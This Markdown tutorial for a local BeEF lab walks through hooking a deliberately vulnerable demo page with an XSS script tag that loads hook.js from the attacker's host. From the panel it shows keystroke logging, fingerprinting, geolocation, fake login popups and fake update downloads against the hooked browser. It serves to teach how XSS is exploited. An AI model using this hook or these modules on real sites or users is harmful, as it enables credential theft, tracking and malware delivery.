# BeEF Tutorial

This tutorial assumes you followed the [startup instructions](README.md) and
that the BeEF application is up and running, and can be reached at
[http://beef.local] as well as [http://vulnerable.local].

Let's see what you can do with BeEF: This tutorial will show you, as an
attacker, what you can do to a victim, by exploiting a Cross-Site Scripting
vulnerability.

## Attacker's point of view (1)

First, let's log onto the administrative panel by going to
[http://beef.local:3000/ui/panel] Enter here the login credentials (the default
username / password is `beefadmin` / `difficultpassword`).

This is the view point of the attacker. At the left hand there's an overview
with Hooked Browsers: clients that can be controlled by the BeEF framework. When
starting up, this will be empty.

## Victim's point of view

For the victim's point of view, open a *new browser window*. Let's now surf to a
vulnerable site which automatically contains a Cross-Site Scripting exploit
payload. In real life this would be a vulnerable site, where an attacker managed
to exploit a Cross-Site Scripting vulnerability.

[http://vulnerable.local:3000/demos/basic.html]

So now you're visiting a vulnerable website, *which automatically has been
'exploited' for demonstration purposes*: a payload has been added.

The payload contains a hook to the attacker's BeEF instance: `<script
src="http://beef.local:3000/hook.js">`. What does this do? Well, this ensures
that the web site *is hooked* onto the BeEF application.

Remember you're visiting the site
[http://vulnerable.local:3000/demos/basic.html] . Try to enter something in the
form field.

## Attacker's point of view (2)

Switching back to [http://beef.local:3000/ui/panel] , at the left hand you can
see that a victim is online: a browser is currently hooked. From this moment on,
the attacker controls all of the web content in the
[http://vulnerable.local:3000] tab. Click in the left hand on the browser in the
`vulnerable.local` domain.

On the active tab *Details* you can see all kinds of information about the
victim: The operating system for example, but also screen resolution for
example, settings, and enabled browser plugins.

Select the tab *Logs*. Here you can see what the victim did during the session.
All entered text as well as mouse and keyboard commands are visible. So
everything that a user now enters at the site [http://vulnerable.local:3000]
will be intercepted and sent to the site of the attacker.

### Fingerprint the victim

First let's fingerprint the browser, so the victim can be followed. Select the
*Commands* tab. This is where the majority of actions will be performed.

Search for *fingerprint*, and click on the *Fingerprint Browser* module. Now, in
the rightmost side of the screen you can click on *Execute*. This will execute
the selected command.

In the *Module Results History* section, an entry appears, with the selected
command. If you click on the command, which will have label *command 1*, you
will see the results at the right hand side.

Search for *geolocation* and select the *Get Geolocation (Third Party)* module.
In the rightmost side, select for example the `https://ipinfo.io/json` API. If
you now click on *Execute*, the attacker will find out where the victim,
visiting [http://vulnerable.local:3000], will be located.

### Trick the victim

Next the attacker can trick the victim into divulging secrets. Search for
*Pretty Theft* and execute that module. The victim will now see a popup, asking
to enter a username and password. This is how credentials can be stolen.

For another example, search for *Fake* and select the *Fake Flash Update*
module. This will send a convincingly looking update notification. As soon as
the victim clicks **anywhere**, a file will be downloaded. The payload itself
can be modified in the web interface.

For another example, search for *Notification* and select the *Fake Notification
Bar (Chrome)* module. This will send a notification to the victim. If the victim clicks
on the notification, it will download a binary file.
Note that this step will fail (the binary file isn't present on our Attacker
server), but this will demonstrate how easy it is to trick victims.

### GOD exploit

For the ultimate exploit, search for *rick* and select the *Redirect Browser
(Rickroll)* module. Execute this module, and the victim will be shown the
infamous Rick Astley video.

Of course these are all benign examples, but imagine what a skilled attacker can
do, having such control over the victim's browser and ultimately security of its
operating system.
